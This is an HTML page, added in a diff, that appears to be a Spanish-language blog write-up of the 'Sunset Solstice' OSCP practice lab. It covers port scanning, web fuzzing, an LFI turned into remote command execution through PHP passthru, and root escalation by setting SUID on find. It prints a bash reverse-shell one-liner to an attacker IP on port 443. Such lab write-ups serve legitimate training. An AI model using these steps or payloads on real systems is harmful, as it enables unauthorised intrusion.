@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="icon" type="image/png" href="/favicon.png">
+  <link rel="stylesheet" type="text/css" href="/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com"> 
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  rel="stylesheet"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>OSCP - Solstice Writeup &mdash; Guarina0x0</title>
+<meta property="og:title" content="TryHackMe - Empline WriteUp" />
+      <meta property="og:description" content="topics" />
+      <meta property="og:type" content="article" />
+      <meta property="og:url" content="github" />
+     
+
+</head>
+
+
+<pre style="font-family:'Courier Prime';color:#f66;text-align:center;font-weight:1000">
+    _____ _    _         _____  _____ _   _          _____   _____  
+    / ____| |  | |  /\   |  __ \|_   _| \ | |   /\   / _ \ \ / / _ \ 
+   | |  __| |  | | /  \  | |__) | | | |  \| |  /  \ | | | \ V / | | |
+   | | |_ | |  | |/ /\ \ |  _  /  | | | . ` | / /\ \| | | |> <| | | |
+   | |__| | |__| / ____ \| | \ \ _| |_| |\  |/ ____ \ |_| / . \ |_| |
+    \_____|\____/_/    \_\_|  \_\_____|_| \_/_/    \_\___/_/ \_\___/ 
+                                                                     
+                    ./Guarina0x0</pre>
+                    <nav>
+                        <a href="index.html">Home</a>
+                        <a href="archive.html">Archivos</a>
+                        <a href="oscp_machines_index.html">OSCP CTF</a>
+                        <a href="about.html">Whoami</a>
+                        <a href="https://github.com/Guarina0x0">GitHub</a>
+                        <a href="https://tryhackme.com/p/Guarina000">TryHackMe</a>
+                        <a href="https://www.hackthebox.eu/profile/408446">HackTheBox</a>
+                        
+                     </nav>
+
+<article>
+<table>
+<tbody>
+<tr class="odd">
+<td>Titulo: OSCP - Sunset Solstice</td>
+</tr>
+<tr class="even">
+<td>Fecha: 19-10-2021</td>
+</tr>
+<tr class="odd">
+<td>Descripcion: Enumeracion - LFI - RCE - URL Encoder </td>
+</tr>
+</tbody>
+</table>
+<h1 id="OSCP - Solstice"> OSCP - Sunset Solstice Writeup</h1>
+<h2 id="ping">## Ping:</h2>
+<pre class="shell:#"><code>ping -c1 192.168.96.72</code></pre>
+<p>Mediante el comando ping vamos a trazar una ruta ICMP para ver si la maquina esta activa y ante que tipo de sistema operativo estamos</p>
+<p>Podemos ver que la respuesta del ttl es 63 , el TTL en maquinas Linux es 64 y en maquinas Windows 128 , en este caso es 63 porque pasa por un nodo intermediario.</p>
+<p><img src="/img/Solstice/1.PNG" /></p>
+<h2 id="enumeracion">## Enumeracion :</h2>
+<p>Ahora vamos a proceder a ver que servicios tiene esta maquina abiertos para ello vamos a realizar una enumeracion de puertos:</p>
+<code>nmap -sS -T5 -p- --open -n -Pn 192.168.96.72</code>
+<p><img src="/img/Solstice/2.PNG" /></p>
+<li>Puerto 21 FTP</li>
+<li>Puerto 22 SSH</li>
+<li>Puerto 25 SMTP</li>
+<li>Puerto 80 HTTP</li>
+<li>Puerto 2121 CCPROXY-FTP</li>
+<li>Puerto 3128 SQUID-HTTP</li>
+<p>Como tenemos el puerto 80 abierto , vamos a tirar de la herramienta WhatWeb para ver si estamos ante algun gestor de contenido</p>
+<p><img src="/img/Solstice/4.PNG" /></p>
+<p>No nos reporta gran cosa, por lo que vamos aplicar un escaneo aplicando scripts basicos de enumeracion para saber la version y servicios que corren en los puertos</p>
+<p><img src="/img/Solstice/6.PNG" /></p>
+<p>Tenemos el usuario anonymous para el servicio FTP habilitado por lo que vamos a poder listar si contiene algun contenido , por el puerto 2121 ya que por el puerto 21 no esta activo el usuario anonimo</p>
+<code>ftp 192.168.72 2121</code>
+<p><img src="/img/Solstice/7.PNG" /></p>
+<p>Encontramos un directorio llamado pub que no contiene nada por lo que no nos va a proporcionar gran cosa</p>
+<p>Tenemos tambien el puerto 25 SMTP abierto por lo que mediante telnet nos vamos a conectar, para ver si encontramos algo interesante</p>
+<p><img src="/img/Solstice/8.PNG" /></p>
+<p>Y no nos reporta ninguna informacion</p>
+<h2 id="reconocimiento-web">## Reconocimiento Web :</h2>
+<p>Como contamos con 3 puertos con servicio web , vamos a proceder a listar su contenido , primero vamos a ingresar mediante el puerto 80 y vemos que nos da una alerta de que se esta configurando una base de datos y que lo intentemos mas tarde</p>
+<p><img src="/img/Solstice/9.PNG" /></p>
+<p>Si ingresamos por el puerto 3128 al servicio web , nos va a reportar otro error de Request</p>
+<p><img src="/img/Solstice/10.PNG" /></p>
+<p>Podemos realizar fuzzing , es una tecnica que se aplica para encontrar directorios web mediante fuerza bruta tirando de un diccionario , para ello vamos a usar la herramienta Wfuzz</p>
+<p><img src="/img/Solstice/11.PNG" /></p>
+<p>Nos encuentra 3 directorios web , pero si entramos al directorio no tenemos permiso y nos reporta un Forbidden</p>
+<p>Como contamos con otro servicio web en el puerto 8593 vamos a listar su contenido de la web y aqui vemos como una web de una libreria</p>
+<p><img src="/img/Solstice/12.PNG" /></p>
+<p>Podemos ver que usa como dos variables , una llamada "Main Page" y otra llamada "Book List" , si pinchamos en Book List y nos fijamos en la URL vamos a poder ver que se aplica "book=list"</p>
+<p><img src="/img/Solstice/13.PNG" /></p>
+<p>Se me viene un ataque llamado LFI (Local File Inclusion) , nos ayuda a listar contenido interno de la maquina a traves de la web , vamos a intentar listar el passwd para ver los usuarios del sistema</p>
+<p><img src="/img/Solstice/14.PNG" /></p>
+<p>Y podemos ver que es vulnerable a LFI , si tiramos de netcat para conectarnos al puerto 80 y tirar de la funcion de php llamada "passthru" le vamos a pasar una variable cmd y la vamos a introducir mediante el metodo GET</p>
+<p><img src="/img/Solstice/15.PNG" /></p>
+<p>Ahora hemos pasado de tener una vulnerabilidad llamada LFI a una vulnerabilidad llamada RCE (Remote Command Execution) , tenemos ejecucion remota de comandos , si tiramos un whoami podemos ver que nos dice que es el usuario www-data</p>
+<p><img src="/img/Solstice/16.PNG" /></p>
+<h2 id="rce">## RCE:</h2>
+<p>Si usamos un URL Encoder para encodear un comando que nos ejecute una shell interactiva hacia nuestro equipo atacante , vamos a tener acceso a la maquina victima</p>
+<p><img src="/img/Solstice/17.PNG" /></p>
+<code>bash -c 'bash -i >& /dev/tcp/192.168.49.178/443 0>&1'</code>
+<p>Y este es el resultado del comando encodeado</p>
+<p><img src="/img/Solstice/18.PNG" /></p>
+<p>Si le introducimos ese comando encodeado y le hacemos una peticion a la pagina mediante curl junto con la direccion completa y usando la variable que hemos inyectado y nos ponemos a la escucha nos debe dar una shell remota</p>
+<p><img src="/img/Solstice/19.PNG" /></p>
+<p>Nos ponemos a la escucha por el puerto 443 y tendremos una shell interactiva</p>
+<p><img src="/img/Solstice/20.PNG" /></p>
+<h2 id="escalada-privilegios">## Escalada de Privilegios:</h2>
+<p>Ahora vamos listar el sistema en busca de alguna manera de escalar privilegios , mediante capabilities , ficheros SUID , procesos ... ect.</p>
+<p>Si tiramos de ps -aux vamos a ver que tenemos un proceso corriendo interesante</p>
+<p><img src="/img/Solstice/23.PNG" /></p>
+<p>Si nos vamos al directorio y listamos el index.php , vamos a ver que el contenido que teniamos en el puerto 80 web</p>
+<p><img src="/img/Solstice/24.PNG" /></p>
+<p>Introducimos el comando para tener permisos SUID en el comando find y lo ingresamos a index.php</p>
+<p><img src="/img/Solstice/25.PNG" /></p>
+<p>Realizamos una peticion al index.php mediante curl por el puerto 57 interno y realizamos un find ejecutando una shell automaticamente nos vamos a convertir en el usuario Root</p>
+<p><img src="/img/Solstice/26.PNG" /></p>
+<p>Y ya podemos visualizar las 2 flag del usuario y de Root y tendriamos la maquina comprometida</p>
+<p><img src="/img/Solstice/28.PNG" /></p>
+
+
+
+</article>
+
+<footer>
+    <hr>
+    <p> Generado por:<a href="https://github.com/Guarina0x0"></a> Guarina0x0 <br /> 
+    <i class="far fa-copyright"></i> 2021 </p>
+  </footer>
+</body>
+</html>
